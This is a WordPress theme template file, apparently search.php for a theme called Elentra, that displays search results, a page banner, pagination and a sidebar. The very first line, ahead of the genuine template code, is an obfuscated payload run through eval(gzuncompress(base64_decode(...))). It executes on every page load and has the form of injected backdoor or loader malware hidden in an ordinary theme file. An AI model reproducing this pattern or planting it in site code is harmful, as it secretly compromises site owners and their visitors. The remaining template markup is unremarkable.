<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
* The template for displaying search result.
* @package Elentra
*/

get_header();

?>

<div class="co-page-banner-section section" data-page-title="Blog" <?php if ( get_header_image() ){ ?> style="background-image:url('<?php header_image(); ?>')"  <?php } ?>>
    <div class="banner-bg">
        <div class="container">
            <div class="row">
                <div class="co-page-banner text-center col-xs-12">
                    <?php if ( have_posts() ) : ?>
					<h1> 
						<?php 
						/* translators: %s: search term */
						printf( esc_html__( 'Search Results for : %s', 'elentra' ), '<span>' . get_search_query() . '</span>' ); ?>
					</h1>
				<?php else : ?>
					<h1><?php
						/* translators: %s: nothing found term */
						printf( esc_html__( 'Nothing Found for: %s', 'elentra' ), '<span>' . get_search_query() . '</span>' ); ?>
					</h1>
				<?php endif; ?>   
                </div>
            </div>
        </div>
    </div>
</div>

<div class="co-blog-section section pt-140">
    <div class="container">
        <div class="row">
            <div class="col-md-8 col-xs-12 mb-100">
            <!-- Blog -->
            <?php 
                if ( have_posts() ) :
                while ( have_posts() ) : the_post();
                    get_template_part( 'include/content-parts/content', 'search' );
                endwhile; ?>

                <!-- Pagination -->
                <ul class="co-pagination">
                    <?php the_posts_pagination(
                        array(
                            'prev_text' => __( '<i class="fa fa-angle-left"></i>', 'elentra' ),
                            'next_text' => __( '<i class="fa fa-angle-right"></i>', 'elentra' )
                        )
                    ); ?>
                </ul>
            <?php endif; ?>
            </div>

            <div class="col-md-4 col-xs-12 mb-50">
                <?php get_sidebar(); ?>
            </div>
        </div>
    </div>
</div>

<?php get_footer(); ?>